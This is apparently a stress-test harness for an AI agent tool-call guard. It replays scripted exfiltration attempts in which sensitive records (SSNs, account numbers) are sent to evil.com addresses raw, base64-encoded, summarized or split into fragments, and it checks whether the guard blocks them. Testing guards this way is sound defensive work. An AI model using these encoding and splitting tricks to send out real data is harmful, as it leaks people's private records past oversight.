import { mkdir, readdir, readFile, stat, writeFile } from 'node:fs/promises';
import { performance } from 'node:perf_hooks';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { guard } from '../../dist/index.js';
import { STRESS_LEVELS, STRESS_VERTICALS } from './matrix.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '../..');

function parseArgs(argv) {
  const args = {};
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (!token.startsWith('--')) continue;
    const key = token.slice(2);
    const next = argv[index + 1];
    if (!next || next.startsWith('--')) {
      args[key] = 'true';
      continue;
    }
    args[key] = next;
    index += 1;
  }
  return args;
}

function defaultValidationSequence() {
  return `validation-${new Date().toISOString().replace(/[:.]/g, '-')}`;
}

function preview(value) {
  const compact = String(value).replace(/\s+/g, ' ').trim();
  return compact.length > 160 ? `${compact.slice(0, 157)}...` : compact;
}

function scenarioSlug(value) {
  return path
    .basename(String(value))
    .replace(/\.[^.]+$/, '')
    .replace(/[^a-z0-9]+/gi, '-')
    .replace(/^-+|-+$/g, '')
    .toLowerCase();
}

function extractSensitiveLines(text) {
  const lines = String(text).split(/\r?\n/);
  const sensitivePattern =
    /@|\b\d{3}[- ]?\d{2}[- ]?\d{4}\b|\b(?:ACCT|ACCOUNT)[-_A-Z0-9]*\b|\b\d{9}\b|\$\d|USD|\bbalance\b|\bpatient\b|\binsurance\b|\bvendor\b/i;
  const matched = lines.filter((line) => sensitivePattern.test(line));
  return matched.length > 0 ? matched.join('\n') : lines.slice(0, 10).join('\n');
}

function chunkText(text, chunkCount) {
  const source = String(text);
  const size = Math.ceil(source.length / chunkCount);
  const parts = [];
  for (let index = 0; index < chunkCount; index += 1) {
    parts.push(source.slice(index * size, (index + 1) * size));
  }
  return parts.filter(Boolean);
}

function unique(values) {
  return [...new Set(values.filter(Boolean))];
}

function percentile(values, percentileRank) {
  if (values.length === 0) {
    return 0;
  }

  const sorted = [...values].sort((left, right) => left - right);
  const index = Math.min(
    sorted.length - 1,
    Math.max(0, Math.ceil((percentileRank / 100) * sorted.length) - 1),
  );
  return sorted[index];
}

function summarizeDurations(values) {
  if (values.length === 0) {
    return {
      averageMs: 0,
      p50Ms: 0,
      p95Ms: 0,
      maxMs: 0,
    };
  }

  return {
    averageMs: values.reduce((sum, value) => sum + value, 0) / values.length,
    p50Ms: percentile(values, 50),
    p95Ms: percentile(values, 95),
    maxMs: Math.max(...values),
  };
}

function extractFragmentTargets(text) {
  const source = String(text);
  const targets = [];

  const ssns = source.match(/\b\d{3}[- ]?\d{2}[- ]?\d{4}\b/g) ?? [];
  for (const value of ssns) {
    const digits = value.replace(/\D/g, '');
    if (digits.length >= 9) {
      targets.push(digits);
    }
  }

  const accountMatches = source.match(/\b(?:ACCT|ACCOUNT)[-_A-Z0-9]{4,}\b/gi) ?? [];
  for (const value of accountMatches) {
    const canonical = value.replace(/[^a-z0-9]/gi, '').toLowerCase();
    if (canonical.length >= 8) {
      targets.push(canonical);
    }
  }

  const routingMatches = source.match(/\b\d{9}\b/g) ?? [];
  for (const value of routingMatches) {
    if (value.length === 9) {
      targets.push(value);
    }
  }

  const currencyMatches =
    source.match(/(?:\$|USD\s?)\d+(?:,\d{3})*(?:\.\d{2})?|\b\d+(?:,\d{3})*(?:\.\d{2})?\s?(?:USD|dollars?)\b/gi) ??
    [];
  for (const value of currencyMatches) {
    const canonical = value
      .replace(/[^0-9.]/g, '')
      .replace(/^0+(?=\d)/, '');
    if (canonical.length >= 5) {
      targets.push(canonical);
    }
  }

  return unique(targets);
}

function splitForReassembly(value) {
  const source = String(value);
  if (source.length < 6) {
    return [source];
  }

  const partLength = Math.ceil(source.length / 3);
  const parts = [];
  for (let index = 0; index < source.length; index += partLength) {
    parts.push(source.slice(index, index + partLength));
  }
  return parts.filter(Boolean);
}

function buildSplitFragments(trustedText) {
  const fragmentTargets = extractFragmentTargets(trustedText);
  return fragmentTargets.length > 0
    ? fragmentTargets.flatMap((target) => splitForReassembly(target)).slice(0, 3)
    : chunkText(extractSensitiveLines(trustedText), 3);
}

async function listFiles(dir) {
  try {
    const entries = await readdir(dir);
    const files = [];
    for (const entry of entries) {
      const fullPath = path.join(dir, entry);
      const entryStat = await stat(fullPath);
      if (entryStat.isFile()) {
        files.push(fullPath);
      }
    }
    return files.sort();
  } catch {
    return [];
  }
}

async function discoverCorpus(corpusRoot, selectedVerticals) {
  const corpus = [];
  for (const vertical of selectedVerticals) {
    const trustedDir = path.join(corpusRoot, vertical, 'trusted');
    const untrustedDir = path.join(corpusRoot, vertical, 'untrusted');
    let trustedManifest;
    let untrustedManifest;
    try {
      trustedManifest = JSON.parse(await readFile(path.join(trustedDir, 'manifest.json'), 'utf8'));
      untrustedManifest = JSON.parse(await readFile(path.join(untrustedDir, 'manifest.json'), 'utf8'));
    } catch {
      continue;
    }

    const trustedDocs = trustedManifest.documents ?? [];
    const untrustedDocs = untrustedManifest.documents ?? [];
    if (trustedDocs.length === 0 || untrustedDocs.length === 0) {
      continue;
    }

    const trustedFiles = await listFiles(trustedDir);
    const untrustedFiles = await listFiles(untrustedDir);

    for (const trustedDoc of trustedDocs) {
      const trustedFile = path.join(trustedDir, trustedDoc.path ?? '');
      if (!trustedFiles.includes(trustedFile)) {
        continue;
      }
      for (const untrustedDoc of untrustedDocs) {
        const untrustedFile = path.join(untrustedDir, untrustedDoc.path ?? '');
        if (!untrustedFiles.includes(untrustedFile)) {
          continue;
        }
        corpus.push({
          vertical,
          trustedFile,
          untrustedFile,
          trustedLabel: trustedDoc.label ?? path.basename(trustedFile),
          untrustedLabel: untrustedDoc.label ?? path.basename(untrustedFile),
        });
      }
    }
  }
  return corpus;
}

function buildExecutors({ trustedFile, untrustedFile, webhookUrl }) {
  return {
    readTrustedCorpus: async () => readFile(trustedFile, 'utf8'),
    fetchUntrustedCorpus: async () => readFile(untrustedFile, 'utf8'),
    transformSensitiveSummary: async (args) => extractSensitiveLines(String(args.content ?? '')),
    postWebhook: async (args) => {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-cerberus-stress': 'true',
        },
        body: JSON.stringify({
          vertical: args.vertical,
          level: args.level,
          recipient: args.recipient,
          payload: args.payload,
          sentAt: new Date().toISOString(),
        }),
      });
      return `POST ${webhookUrl} -> ${response.status}`;
    },
  };
}

function controlRecipientFor(vertical) {
  return `${vertical.replace(/[^a-z0-9-]/gi, '').toLowerCase()}-ops@corp.internal`;
}

function attackRecipientFor(vertical, index = 0) {
  const prefixes = ['audit', 'ops', 'relay'];
  const prefix = prefixes[index % prefixes.length];
  return `${prefix}-${vertical.replace(/[^a-z0-9-]/gi, '').toLowerCase()}@evil.com`;
}

function approvedVendorRecipientFor(vertical) {
  return `${vertical.replace(/[^a-z0-9-]/gi, '').toLowerCase()}-vendor@approved-partner.example`;
}

function buildRedactedSummary(text) {
  return extractSensitiveLines(text)
    .replace(/\b\d{3}[- ]?\d{2}[- ]?\d{4}\b/g, '[REDACTED-SSN]')
    .replace(/\b(?:ACCT|ACCOUNT)[-_A-Z0-9]{4,}\b/gi, '[REDACTED-ACCOUNT]')
    .replace(/\b\d{9}\b/g, '[REDACTED-ROUTING]')
    .replace(/(?:\$|USD\s?)\d+(?:,\d{3})*(?:\.\d{2})?/gi, '[REDACTED-AMOUNT]')
    .replace(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, '[REDACTED-EMAIL]');
}

function buildLevelPlan(level, trustedText, vertical, webhookUrl) {
  if (level.technique === 'authorized-control') {
    const recipient = controlRecipientFor(vertical);
    return {
      config: {
        alertMode: 'interrupt',
        threshold: 3,
        authorizedDestinations: ['corp.internal'],
        trustOverrides: [
          { toolName: 'readTrustedCorpus', trustLevel: 'trusted' },
          { toolName: 'fetchUntrustedCorpus', trustLevel: 'untrusted' },
        ],
      },
      steps: [
        { label: 'Read trusted corpus', tool: 'readTrustedCorpus', args: {} },
        {
          label: 'Send authorized control message',
          tool: 'postWebhook',
          args: {
            vertical,
            level: level.id,
            recipient,
            payload: `Authorized control for ${vertical}.`,
          },
        },
      ],
      expectedBlocked: false,
      requiredSignals: [],
    };
  }

  if (level.technique === 'approved-vendor') {
    const recipient = approvedVendorRecipientFor(vertical);
    return {
      config: {
        alertMode: 'interrupt',
        threshold: 3,
        authorizedDestinations: ['approved-partner.example'],
        trustOverrides: [
          { toolName: 'readTrustedCorpus', trustLevel: 'trusted' },
          { toolName: 'fetchUntrustedCorpus', trustLevel: 'untrusted' },
        ],
      },
      steps: [
        { label: 'Read trusted corpus', tool: 'readTrustedCorpus', args: {} },
        {
          label: 'Send approved vendor packet',
          tool: 'postWebhook',
          args: {
            vertical,
            level: level.id,
            recipient,
            payload: `Approved vendor coordination for ${vertical}. Reference packet follows.\n${extractSensitiveLines(trustedText)}`,
          },
        },
      ],
      expectedBlocked: false,
      requiredSignals: [],
    };
  }

  if (level.technique === 'redacted-external') {
    const recipient = `coordination-${vertical.replace(/[^a-z0-9-]/gi, '').toLowerCase()}@external-projects.example`;
    return {
      config: {
        alertMode: 'interrupt',
        threshold: 3,
        authorizedDestinations: ['external-projects.example'],
        trustOverrides: [
          { toolName: 'readTrustedCorpus', trustLevel: 'trusted' },
          { toolName: 'fetchUntrustedCorpus', trustLevel: 'untrusted' },
        ],
      },
      steps: [
        { label: 'Read trusted corpus', tool: 'readTrustedCorpus', args: {} },
        {
          label: 'Generate redacted coordination note',
          tool: 'transformSensitiveSummary',
          args: { content: buildRedactedSummary(trustedText) },
        },
        {
          label: 'Send redacted external coordination',
          tool: 'postWebhook',
          args: {
            vertical,
            level: level.id,
            recipient,
            payload: buildRedactedSummary(trustedText),
          },
        },
      ],
      expectedBlocked: false,
      requiredSignals: [],
    };
  }

  const commonConfig = {
    alertMode: level.technique === 'split' ? 'alert' : 'interrupt',
    threshold: level.technique === 'split' ? 4 : 3,
    splitExfilThresholdBytes: 2048,
    trustOverrides: [
      { toolName: 'readTrustedCorpus', trustLevel: 'trusted' },
      { toolName: 'fetchUntrustedCorpus', trustLevel: 'untrusted' },
    ],
  };

  const steps = [
    { label: 'Read trusted corpus', tool: 'readTrustedCorpus', args: {} },
    { label: 'Fetch untrusted corpus', tool: 'fetchUntrustedCorpus', args: {} },
  ];

  if (level.technique === 'direct-raw') {
    steps.push({
      label: 'Post raw payload',
      tool: 'postWebhook',
      args: {
        vertical,
        level: level.id,
        recipient: attackRecipientFor(vertical),
        payload: trustedText,
      },
    });
    return {
      config: commonConfig,
      steps,
      expectedBlocked: true,
      requiredSignals: ['EXFILTRATION_RISK', 'INJECTION_CORRELATED_OUTBOUND'],
    };
  }

  if (level.technique === 'encoded') {
    steps.push({
      label: 'Post base64 payload',
      tool: 'postWebhook',
      args: {
        vertical,
        level: level.id,
        recipient: attackRecipientFor(vertical),
        payload: Buffer.from(trustedText, 'utf8').toString('base64'),
      },
    });
    return {
      config: commonConfig,
      steps,
      expectedBlocked: true,
      requiredSignals: ['ENCODED_EXFILTRATION', 'INJECTION_CORRELATED_OUTBOUND'],
    };
  }

  if (level.technique === 'summary') {
    const summary = extractSensitiveLines(trustedText);
    steps.push({
      label: 'Transform sensitive summary',
      tool: 'transformSensitiveSummary',
      args: { content: trustedText },
    });
    steps.push({
      label: 'Post transformed payload',
      tool: 'postWebhook',
      args: {
        vertical,
        level: level.id,
        recipient: attackRecipientFor(vertical),
        payload: summary,
      },
    });
    return {
      config: commonConfig,
      steps,
      expectedBlocked: true,
      requiredSignals: ['INJECTION_CORRELATED_OUTBOUND'],
    };
  }

  const fragments = buildSplitFragments(trustedText);

  if (level.technique === 'split-domain-cluster') {
    for (const [index, chunk] of fragments.entries()) {
      steps.push({
        label: `Post clustered fragment ${index + 1}`,
        tool: 'postWebhook',
        args: {
          vertical,
          level: level.id,
          recipient: attackRecipientFor(vertical, index),
          payload: chunk,
        },
      });
    }
    return {
      config: { ...commonConfig, alertMode: 'alert', threshold: 4 },
      steps,
      expectedBlocked: false,
      requiredSignals: ['SPLIT_EXFILTRATION'],
    };
  }

  if (level.technique === 'sequential') {
    for (const [index, chunk] of fragments.entries()) {
      steps.push({
        label: `Post sequential chunk ${index + 1}`,
        tool: 'postWebhook',
        args: {
          vertical,
          level: level.id,
          recipient: attackRecipientFor(vertical),
          page: index + 1,
          payload: chunk,
        },
      });
    }
    return {
      config: { ...commonConfig, alertMode: 'alert', threshold: 4 },
      steps,
      expectedBlocked: false,
      requiredSignals: ['SPLIT_EXFILTRATION'],
    };
  }

  for (const [index, chunk] of fragments.entries()) {
    steps.push({
      label: `Post fragment ${index + 1}`,
      tool: 'postWebhook',
      args: {
        vertical,
        level: level.id,
        recipient: attackRecipientFor(vertical, index),
        payload: chunk,
      },
    });
  }
  return {
    config: { ...commonConfig, alertMode: 'alert', threshold: 4 },
    steps,
    expectedBlocked: false,
    requiredSignals: ['SPLIT_EXFILTRATION'],
  };
}

async function runScenario(definition) {
  const guarded = guard(
    buildExecutors(definition),
    definition.config,
    ['postWebhook'],
  );
  const steps = [];
  const scenarioStartedAt = performance.now();

  try {
    for (const [index, step] of definition.steps.entries()) {
      const startedAt = performance.now();
      const result = await guarded.executors[step.tool](step.args);
      const durationMs = performance.now() - startedAt;
      const outcome = guarded.getLastOutcome();
      const signals = outcome?.turnId
        ? guarded.session.signalsByTurn.get(outcome.turnId) ?? []
        : [];
      steps.push({
        index,
        label: step.label,
        tool: step.tool,
        blocked: outcome?.blocked ?? false,
        action: outcome?.action ?? 'none',
        score: outcome?.score ?? 0,
        signals: signals.map((signal) => signal.signal),
        durationMs,
        preview: preview(result),
      });
    }

    const finalStep = steps[steps.length - 1];
    const allSignals = [...new Set(steps.flatMap((step) => step.signals))];
    const missingSignals = definition.requiredSignals.filter(
      (signal) => !allSignals.includes(signal),
    );
    const totalDurationMs = performance.now() - scenarioStartedAt;

    return {
      scenarioId: `${definition.vertical}-${definition.level.id}-${scenarioSlug(definition.trustedFile)}-${scenarioSlug(definition.untrustedFile)}-${definition.iteration}`,
      iteration: definition.iteration,
      vertical: definition.vertical,
      level: definition.level.id,
      name: definition.level.name,
      technique: definition.level.technique,
      mode: definition.level.mode,
      description: definition.level.description,
      trustedFile: definition.trustedFile,
      untrustedFile: definition.untrustedFile,
      trustedLabel: definition.trustedLabel,
      untrustedLabel: definition.untrustedLabel,
      passed:
        finalStep.blocked === definition.expectedBlocked && missingSignals.length === 0,
      finalBlocked: finalStep.blocked,
      expectedBlocked: definition.expectedBlocked,
      finalAction: finalStep.action,
      finalScore: finalStep.score,
      matchedSignals: allSignals.filter((signal) => definition.requiredSignals.includes(signal)),
      missingSignals,
      totalDurationMs,
      averageStepDurationMs:
        steps.length === 0 ? 0 : steps.reduce((sum, step) => sum + step.durationMs, 0) / steps.length,
      steps,
    };
  } finally {
    guarded.destroy();
  }
}

function summarize(results) {
  const totalDurations = results.map((result) => result.totalDurationMs ?? 0);
  const totalLatency = summarizeDurations(totalDurations);

  const byVertical = Object.fromEntries(
    STRESS_VERTICALS.map((vertical) => {
      const entries = results.filter((result) => result.vertical === vertical);
      const durations = entries.map((entry) => entry.totalDurationMs ?? 0);
      const latency = summarizeDurations(durations);
      return [
        vertical,
        {
          total: entries.length,
          passed: entries.filter((entry) => entry.passed).length,
          passRate:
            entries.length === 0
              ? 0
              : entries.filter((entry) => entry.passed).length / entries.length,
          averageScore:
            entries.length === 0
              ? 0
              : entries.reduce((sum, entry) => sum + entry.finalScore, 0) / entries.length,
          averageDurationMs: latency.averageMs,
          p95DurationMs: latency.p95Ms,
        },
      ];
    }),
  );

  const byLevel = Object.fromEntries(
    STRESS_LEVELS.map((level) => {
      const entries = results.filter((result) => result.level === level.id);
      const durations = entries.map((entry) => entry.totalDurationMs ?? 0);
      const latency = summarizeDurations(durations);
      return [
        level.id,
        {
          total: entries.length,
          passed: entries.filter((entry) => entry.passed).length,
          passRate:
            entries.length === 0
              ? 0
              : entries.filter((entry) => entry.passed).length / entries.length,
          averageDurationMs: latency.averageMs,
          p95DurationMs: latency.p95Ms,
        },
      ];
    }),
  );

  const scenarioGroups = new Map();
  for (const result of results) {
    const key = `${result.vertical}:${result.level}:${result.technique}:${result.trustedLabel}:${result.untrustedLabel}`;
    const existing = scenarioGroups.get(key);
    if (existing) {
      existing.push(result);
    } else {
      scenarioGroups.set(key, [result]);
    }
  }

  const byScenario = Object.fromEntries(
    [...scenarioGroups.entries()].map(([key, entries]) => [
      key,
      {
        total: entries.length,
        passed: entries.filter((entry) => entry.passed).length,
        passRate:
          entries.length === 0
            ? 0
            : entries.filter((entry) => entry.passed).length / entries.length,
        stable: entries.every((entry) => entry.passed),
        averageDurationMs:
          entries.length === 0
            ? 0
            : entries.reduce((sum, entry) => sum + (entry.totalDurationMs ?? 0), 0) / entries.length,
      },
    ]),
  );

  const benignResults = results.filter((result) => result.mode === 'control');
  const attackResults = results.filter((result) => result.mode === 'attack');
  const benignPassed = benignResults.filter((result) => result.passed).length;
  const attackPassed = attackResults.filter((result) => result.passed).length;

  return {
    total: results.length,
    passed: results.filter((result) => result.passed).length,
    failed: results.filter((result) => !result.passed).length,
    passRate:
      results.length === 0
        ? 0
        : results.filter((result) => result.passed).length / results.length,
    byVertical,
    byLevel,
    byScenario,
    benign: {
      total: benignResults.length,
      passed: benignPassed,
      failed: benignResults.length - benignPassed,
      allowRate: benignResults.length === 0 ? 0 : benignPassed / benignResults.length,
      falsePositiveRate:
        benignResults.length === 0 ? 0 : (benignResults.length - benignPassed) / benignResults.length,
    },
    attacks: {
      total: attackResults.length,
      passed: attackPassed,
      failed: attackResults.length - attackPassed,
      blockRate: attackResults.length === 0 ? 0 : attackPassed / attackResults.length,
    },
    latency: {
      ...totalLatency,
      executionsPerSecond:
        totalDurations.reduce((sum, value) => sum + value, 0) === 0
          ? 0
          : results.length / (totalDurations.reduce((sum, value) => sum + value, 0) / 1000),
    },
  };
}

function printResult(result) {
  const status = result.passed ? 'PASS' : 'FAIL';
  console.log(`\n[${status}] ${result.vertical} ${result.level} — ${result.name}`);
  console.log(`  blocked: expected=${result.expectedBlocked} actual=${result.finalBlocked}`);
  console.log(`  final score=${result.finalScore} action=${result.finalAction}`);
  console.log(
    `  latency: total=${result.totalDurationMs.toFixed(2)}ms avg-step=${result.averageStepDurationMs.toFixed(2)}ms`,
  );
  if (result.matchedSignals.length > 0) {
    console.log(`  matched signals: ${result.matchedSignals.join(', ')}`);
  }
  if (result.missingSignals.length > 0) {
    console.log(`  missing signals: ${result.missingSignals.join(', ')}`);
  }
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const webhookUrl = args['webhook-url'];
  const corpusRoot =
    args['corpus-root'] ?? path.join(projectRoot, 'corpus');
  const validationSequence = args['validation-sequence'] ?? defaultValidationSequence();

  if (!webhookUrl) {
    console.error('Missing required --webhook-url');
    process.exit(1);
  }

  const selectedVerticals = String(args.verticals ?? STRESS_VERTICALS.join(','))
    .split(',')
    .map((value) => value.trim())
    .filter(Boolean);
  const repeats = Math.max(1, Number.parseInt(String(args.repeats ?? '1'), 10) || 1);

  const discovered = await discoverCorpus(corpusRoot, selectedVerticals);
  if (discovered.length === 0) {
    console.error(`No corpus discovered in ${corpusRoot}`);
    console.error('Expected structure: <corpus-root>/<vertical>/{trusted,untrusted}/<files>');
    process.exit(1);
  }

  const scenarios = [];
  for (const corpus of discovered) {
    const trustedText = await readFile(corpus.trustedFile, 'utf8');
    for (let iteration = 1; iteration <= repeats; iteration += 1) {
      for (const level of STRESS_LEVELS) {
        const plan = buildLevelPlan(level, trustedText, corpus.vertical, webhookUrl);
        scenarios.push({
          ...corpus,
          ...plan,
          level,
          webhookUrl,
          iteration,
        });
      }
    }
  }

  const results = [];
  for (const scenario of scenarios) {
    const result = await runScenario(scenario);
    results.push(result);
    printResult(result);
  }

  const report = {
    generatedAt: new Date().toISOString(),
    validationSequence,
    repeats,
    corpusRoot,
    webhookUrl,
    summary: summarize(results),
    results,
  };

  const reportDir = path.join(projectRoot, 'test-results');
  const reportJsonPath = path.join(reportDir, 'stress-harness-report.json');
  await mkdir(reportDir, { recursive: true });
  await writeFile(reportJsonPath, `${JSON.stringify(report, null, 2)}\n`, 'utf8');

  console.log('\nStress Harness Summary');
  console.log(`  Validation sequence: ${validationSequence}`);
  console.log(`  Repeats per scenario: ${repeats}`);
  console.log(`  Total scenarios: ${report.summary.total}`);
  console.log(`  Passed: ${report.summary.passed}`);
  console.log(`  Failed: ${report.summary.failed}`);
  console.log(
    `  Benign allow rate: ${report.summary.benign.passed}/${report.summary.benign.total} (${(report.summary.benign.allowRate * 100).toFixed(1)}%)`,
  );
  console.log(
    `  False-positive rate: ${(report.summary.benign.falsePositiveRate * 100).toFixed(1)}%`,
  );
  console.log(
    `  Attack block rate: ${report.summary.attacks.passed}/${report.summary.attacks.total} (${(report.summary.attacks.blockRate * 100).toFixed(1)}%)`,
  );
  console.log(
    `  Guarded latency: avg=${report.summary.latency.averageMs.toFixed(2)}ms p50=${report.summary.latency.p50Ms.toFixed(2)}ms p95=${report.summary.latency.p95Ms.toFixed(2)}ms max=${report.summary.latency.maxMs.toFixed(2)}ms`,
  );
  console.log(
    `  Throughput: ${report.summary.latency.executionsPerSecond.toFixed(2)} exec/s`,
  );
  console.log(`  JSON report: ${reportJsonPath}`);

  if (report.summary.failed > 0) {
    process.exitCode = 1;
  }
}

await main();
